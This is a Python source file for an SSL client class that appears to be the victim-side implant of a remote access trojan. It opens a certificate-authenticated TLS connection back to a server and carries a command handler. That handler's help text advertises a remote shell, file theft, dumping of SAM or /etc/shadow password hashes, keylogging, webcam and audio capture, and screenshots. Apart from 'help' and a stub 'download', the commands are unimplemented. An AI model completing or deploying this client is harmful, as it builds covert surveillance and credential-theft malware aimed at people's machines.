import socket
import ssl
from utils.logger import setup_logger

# import subprocess

logger = setup_logger()


class SSLClient:
    def __init__(
        self,
        server_host,
        server_port,
        sni_hostname,
        client_cert,
        client_key,
    ):
        self.server_host = server_host
        self.server_port = server_port
        self.sni_hostname = sni_hostname
        self._context = ssl.SSLContext()
        self._context.load_cert_chain(client_cert, client_key)
        self._sock = None
        self._ssock = None

    def close(self):
        if self._ssock:
            self._ssock.close()
        if self._sock:
            self._sock.close()

    def connect(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._ssock = self._context.wrap_socket(
            self._sock,
        )
        self._ssock.connect((self.server_host, self.server_port))

    def send(self, msg):
        self._ssock.send(msg.encode())

    def receive(self):
        try:
            data = self._ssock.recv(4096)

            if not data:
                return None

            return data.decode()

        except Exception as e:
            print(f"Receive error: {e}")
            return None

    def execute_command(self, command: str) -> str:
        command = command.lower().strip()
        if command == "help":
            return (
                "help: Prints all the possible commands\n"
                "download: Gather files from client and send them to server\n"
                "upload: Gather files from server and send them to client\n"
                "shell: Opens an interactive shell/bash/cmd\n"
                "ipconfig: Get the client's network configuration\n"
                "screenshot: Take a screenshot of the client\n"
                "search: Search for a file on the client's filesystem\n"
                "hashdump: Get the SAM or /etc/shadow file based on the OS\n"
                "keylogger: Log every key of the client\n"
                "webcam_snapshot: Take a picture using the client's webcam\n"
                "webcam_stream: Livestream the client's webcam\n"
                "record_audio: Record the client's audio\n"
            )

        if command == "download":
            return "Downloading..."

        else:
            return "This " "command " "is " "not " "implemented"
